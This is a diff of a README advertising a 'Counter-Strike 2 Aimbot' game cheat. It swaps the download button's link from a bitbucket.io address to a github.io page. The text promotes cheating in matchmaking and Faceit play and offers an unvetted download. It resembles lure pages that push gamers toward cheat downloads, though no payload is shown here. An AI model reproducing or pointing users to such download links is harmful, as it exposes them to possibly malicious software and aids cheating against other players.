@@ -2,7 +2,7 @@
 
 Tired of whiffing your shots while the enemy lands every headshot? Welcome to the dark side—where **Counter-Strike 2 Aimbot** gives you pixel-perfect accuracy, lightning-fast flicks, and the kind of game sense that looks straight-up divine. Whether you're playing chill MM or sweaty Faceit, this tool is gonna turn you from silver-tier aim to full-on aim demon 😈.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Counter-Strike-2-Aimbot-dadi.github.io/.github)
 ---
 
 ## 💡 What Is CS2 Aimbot?
